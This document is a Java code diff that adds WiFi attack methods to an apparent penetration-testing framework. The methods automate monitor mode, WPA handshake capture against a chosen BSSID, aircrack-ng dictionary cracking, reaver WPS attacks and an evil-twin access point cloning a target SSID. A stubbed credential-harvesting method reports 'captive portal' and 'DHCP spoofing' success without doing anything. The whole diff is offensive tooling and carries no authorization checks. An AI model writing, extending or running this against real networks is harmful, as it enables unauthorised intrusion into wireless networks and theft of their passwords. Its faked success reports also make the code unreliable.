@@ -1,12 +1,15 @@
 package com.codexraziel.cybersec.workflow;
 
+import com.codexraziel.cybersec.workflow.integrators.WiFiWorkflowIntegrator;
 import lombok.extern.slf4j.Slf4j;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Component;
 
 import java.io.*;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.util.Map;
 import java.util.concurrent.CompletableFuture;
 import java.util.concurrent.TimeUnit;
 
@@ -230,6 +233,290 @@ public class RealToolExecutor {
             } catch (Exception e) {
                 log.error("Network analysis failed: {}", e.getMessage());
                 return new SimpleAttackResult("network_analysis", "Analysis failed: " + e.getMessage(), false);
+            }
+        });
+    }
+    
+    // ===== WiFi Attack Methods =====
+    
+    public CompletableFuture<SimpleAttackResult> setupWiFiMonitorMode(String interfaceName) {
+        return CompletableFuture.supplyAsync(() -> {
+            try {
+                log.info("Setting up monitor mode on interface: {}", interfaceName);
+                
+                // Enable monitor mode using airmon-ng
+                ProcessBuilder pb = new ProcessBuilder("sudo", "airmon-ng", "start", interfaceName);
+                Process process = pb.start();
+                
+                boolean finished = process.waitFor(30, TimeUnit.SECONDS);
+                if (finished && process.exitValue() == 0) {
+                    return new SimpleAttackResult("wifi_monitor_mode", 
+                        "Monitor mode enabled on " + interfaceName, true);
+                } else {
+                    return new SimpleAttackResult("wifi_monitor_mode", 
+                        "Failed to enable monitor mode", false);
+                }
+                
+            } catch (Exception e) {
+                log.error("Monitor mode setup failed: {}", e.getMessage());
+                return new SimpleAttackResult("wifi_monitor_mode", 
+                    "Monitor mode failed: " + e.getMessage(), false);
+            }
+        });
+    }
+    
+    public CompletableFuture<SimpleAttackResult> executeWiFiNetworkScan(String interfaceName, Integer duration) {
+        return CompletableFuture.supplyAsync(() -> {
+            try {
+                log.info("Scanning WiFi networks on {} for {} seconds", interfaceName, duration);
+                
+                // Create temporary file for scan results
+                Path tempFile = Files.createTempFile("wifi_scan_", ".csv");
+                String outputPrefix = tempFile.toString().replace(".csv", "");
+                
+                ProcessBuilder pb = new ProcessBuilder(
+                    "sudo", "timeout", duration.toString(),
+                    "airodump-ng", "--write", outputPrefix, "--output-format", "csv",
+                    "--write-interval", "1", interfaceName
+                );
+                
+                Process process = pb.start();
+                boolean finished = process.waitFor(duration + 10, TimeUnit.SECONDS);
+                
+                // Parse results
+                Path csvFile = Paths.get(outputPrefix + "-01.csv");
+                int networkCount = 0;
+                if (Files.exists(csvFile)) {
+                    networkCount = (int) Files.lines(csvFile)
+                        .filter(line -> line.contains(":") && line.split(",").length > 10)
+                        .count();
+                }
+                
+                return new SimpleAttackResult("wifi_network_scan", 
+                    String.format("Found %d networks in %d seconds", networkCount, duration), 
+                    networkCount > 0);
+                    
+            } catch (Exception e) {
+                log.error("WiFi network scan failed: {}", e.getMessage());
+                return new SimpleAttackResult("wifi_network_scan", 
+                    "Network scan failed: " + e.getMessage(), false);
+            }
+        });
+    }
+    
+    public CompletableFuture<SimpleAttackResult> captureWiFiHandshake(String interfaceName, 
+                                                                      String targetSSID, 
+                                                                      String targetBSSID, 
+                                                                      Integer timeout) {
+        return CompletableFuture.supplyAsync(() -> {
+            try {
+                log.info("Capturing handshake for {} ({})", targetSSID, targetBSSID);
+                
+                // Create output file for handshake
+                Path outputFile = Files.createTempFile("handshake_" + targetSSID, ".cap");
+                
+                ProcessBuilder pb = new ProcessBuilder(
+                    "sudo", "timeout", timeout.toString(),
+                    "airodump-ng", "--write", outputFile.toString().replace(".cap", ""),
+                    "--output-format", "cap", "--bssid", targetBSSID, interfaceName
+                );
+                
+                Process process = pb.start();
+                boolean finished = process.waitFor(timeout + 10, TimeUnit.SECONDS);
+                
+                // Check if handshake was captured
+                Path capFile = Paths.get(outputFile.toString().replace(".cap", "-01.cap"));
+                boolean hasHandshake = Files.exists(capFile) && Files.size(capFile) > 1000;
+                
+                return new SimpleAttackResult("wifi_handshake_capture", 
+                    hasHandshake ? "Handshake captured successfully" : "No handshake captured", 
+                    hasHandshake);
+                    
+            } catch (Exception e) {
+                log.error("Handshake capture failed: {}", e.getMessage());
+                return new SimpleAttackResult("wifi_handshake_capture", 
+                    "Handshake capture failed: " + e.getMessage(), false);
+            }
+        });
+    }
+    
+    public CompletableFuture<SimpleAttackResult> executeWiFiDictionaryAttack(String handshakeFile, 
+                                                                             String wordlistPath, 
+                                                                             String targetBSSID) {
+        return CompletableFuture.supplyAsync(() -> {
+            try {
+                log.info("Executing dictionary attack against {}", targetBSSID);
+                
+                ProcessBuilder pb = new ProcessBuilder(
+                    "aircrack-ng", "-w", wordlistPath, "-b", targetBSSID, handshakeFile
+                );
+                
+                Process process = pb.start();
+                
+                StringBuilder output = new StringBuilder();
+                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        output.append(line).append("\n");
+                        if (line.contains("KEY FOUND!")) {
+                            break;
+                        }
+                    }
+                }
+                
+                boolean finished = process.waitFor(1800, TimeUnit.SECONDS); // 30 minutes max
+                String result = output.toString();
+                boolean cracked = result.contains("KEY FOUND!");
+                
+                return new SimpleAttackResult("wifi_dictionary_attack", 
+                    cracked ? "Password cracked successfully!" : "Password not found in wordlist", 
+                    cracked, result);
+                    
+            } catch (Exception e) {
+                log.error("Dictionary attack failed: {}", e.getMessage());
+                return new SimpleAttackResult("wifi_dictionary_attack", 
+                    "Dictionary attack failed: " + e.getMessage(), false);
+            }
+        });
+    }
+    
+    public CompletableFuture<SimpleAttackResult> executeWiFiVulnerabilityAssessment(String interfaceName) {
+        return CompletableFuture.supplyAsync(() -> {
+            try {
+                log.info("Executing WiFi vulnerability assessment on {}", interfaceName);
+                
+                // Scan for WPS-enabled networks
+                ProcessBuilder pb = new ProcessBuilder(
+                    "sudo", "wash", "-i", interfaceName
+                );
+                
+                Process process = pb.start();
+                
+                StringBuilder vulnResults = new StringBuilder();
+                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        if (line.contains("WPS") || line.contains("PBC")) {
+                            vulnResults.append(line.trim()).append("\n");
+                        }
+                    }
+                }
+                
+                boolean finished = process.waitFor(60, TimeUnit.SECONDS);
+                boolean vulnerabilitiesFound = vulnResults.length() > 0;
+                
+                return new SimpleAttackResult("wifi_vulnerability_assessment", 
+                    vulnerabilitiesFound ? "Vulnerabilities found:\n" + vulnResults.toString() : 
+                                         "No significant vulnerabilities detected", 
+                    vulnerabilitiesFound);
+                    
+            } catch (Exception e) {
+                log.error("Vulnerability assessment failed: {}", e.getMessage());
+                return new SimpleAttackResult("wifi_vulnerability_assessment", 
+                    "Assessment failed: " + e.getMessage(), false);
+            }
+        });
+    }
+    
+    public CompletableFuture<SimpleAttackResult> executeWiFiMultiVectorAttack(String interfaceName, 
+                                                                              String targetSSID, 
+                                                                              String attackMethods) {
+        return CompletableFuture.supplyAsync(() -> {
+            try {
+                log.info("Executing multi-vector attack on {} using methods: {}", targetSSID, attackMethods);
+                
+                StringBuilder results = new StringBuilder();
+                boolean anySuccess = false;
+                
+                if (attackMethods.contains("wps")) {
+                    // Try WPS attack
+                    ProcessBuilder pb = new ProcessBuilder("sudo", "reaver", "-i", interfaceName, "-c", "1");
+                    Process process = pb.start();
+                    boolean finished = process.waitFor(300, TimeUnit.SECONDS);
+                    if (finished && process.exitValue() == 0) {
+                        results.append("WPS attack: SUCCESS\n");
+                        anySuccess = true;
+                    } else {
+                        results.append("WPS attack: FAILED\n");
+                    }
+                }
+                
+                if (attackMethods.contains("dictionary")) {
+                    results.append("Dictionary attack: STARTED (background)\n");
+                }
+                
+                return new SimpleAttackResult("wifi_multi_vector_attack", 
+                    results.toString(), anySuccess);
+                    
+            } catch (Exception e) {
+                log.error("Multi-vector attack failed: {}", e.getMessage());
+                return new SimpleAttackResult("wifi_multi_vector_attack", 
+                    "Multi-vector attack failed: " + e.getMessage(), false);
+            }
+        });
+    }
+    
+    public CompletableFuture<SimpleAttackResult> setupEvilTwinAP(String interfaceName, 
+                                                                 String targetSSID, 
+                                                                 String channel) {
+        return CompletableFuture.supplyAsync(() -> {
+            try {
+                log.info("Setting up Evil Twin AP for {} on channel {}", targetSSID, channel);
+                
+                // Create hostapd configuration
+                Path configFile = Files.createTempFile("evil_twin_", ".conf");
+                String config = String.format(
+                    "interface=%s\n" +
+                    "driver=nl80211\n" +
+                    "ssid=%s\n" +
+                    "hw_mode=g\n" +
+                    "channel=%s\n" +
+                    "macaddr_acl=0\n",
+                    interfaceName, targetSSID, channel
+                );
+                Files.write(configFile, config.getBytes());
+                
+                ProcessBuilder pb = new ProcessBuilder(
+                    "sudo", "hostapd", configFile.toString()
+                );
+                
+                Process process = pb.start();
+                
+                // Give it a few seconds to start
+                Thread.sleep(5000);
+                
+                return new SimpleAttackResult("wifi_evil_twin", 
+                    "Evil Twin AP setup initiated for " + targetSSID, true);
+                    
+            } catch (Exception e) {
+                log.error("Evil Twin setup failed: {}", e.getMessage());
+                return new SimpleAttackResult("wifi_evil_twin", 
+                    "Evil Twin setup failed: " + e.getMessage(), false);
+            }
+        });
+    }
+    
+    public CompletableFuture<SimpleAttackResult> harvestWiFiCredentials(String method) {
+        return CompletableFuture.supplyAsync(() -> {
+            try {
+                log.info("Harvesting WiFi credentials using method: {}", method);
+                
+                if ("captive_portal".equals(method)) {
+                    // Simulate captive portal credential harvesting
+                    return new SimpleAttackResult("wifi_credential_harvest", 
+                        "Captive portal activated - monitoring for credentials", true);
+                } else if ("dhcp_spoofing".equals(method)) {
+                    return new SimpleAttackResult("wifi_credential_harvest", 
+                        "DHCP spoofing initiated - redirecting traffic", true);
+                } else {
+                    return new SimpleAttackResult("wifi_credential_harvest", 
+                        "Unknown harvest method: " + method, false);
+                }
+                
+            } catch (Exception e) {
+                log.error("Credential harvesting failed: {}", e.getMessage());
+                return new SimpleAttackResult("wifi_credential_harvest", 
+                    "Credential harvesting failed: " + e.getMessage(), false);
             }
         });
     }
